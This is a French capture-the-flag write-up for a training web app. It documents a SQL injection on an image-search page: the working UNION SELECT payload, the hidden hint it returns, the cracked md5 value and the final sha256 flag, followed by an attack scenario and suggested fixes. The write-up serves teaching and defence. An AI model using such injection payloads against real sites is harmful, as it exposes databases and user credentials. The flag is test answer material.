#

#### Page: __


## Description de la vulnerabilte:
Grace à la précédente SQLI découverte, on connait déjà les noms des tables et des
colonnes de la base de données.

On determine logiquement que la table utilisée ici est:  
Table `list_images`:
```
id
url
title
comment
```

On teste l'ensemble des columns et on finit par trouver que:
```
?page=searchimg&id=1 OR 1=1 union select comment,null from list_images&Submit=Submit#
```
renvoie l'information:
```
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

`1928e8083cf461a51303633093573c46` est un hash md5 de `albatroz`.

On hash `albatroz` en sha256:
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```


## Scénario d'attaque:
Une vulnerabilité de type injection SQL peut permettre d'accéder ou de
modifier une base de données de type SQL.
Dans certains cas, comme celui ci, la faille permet de récupérer l'intégralité
du contenu de la base, dont les idendifiants et les mots de passe des utilisateurs
du site.


## Correctifs:
- Utiliser `mysqli_real_escape_string()` afin d'échapper les caractères spéciaux
provenant des entrées utilisateur.
- Utiliser des procédures stockées, qui sont des instructions SQL précompilées,
 à la place du SQL dynamique.
- La plupart des ORM utilisent des systèmes de requêtes préparées dans lesquelles
le SGBD se charge alors de l'echappement et du contrôle des requêtes
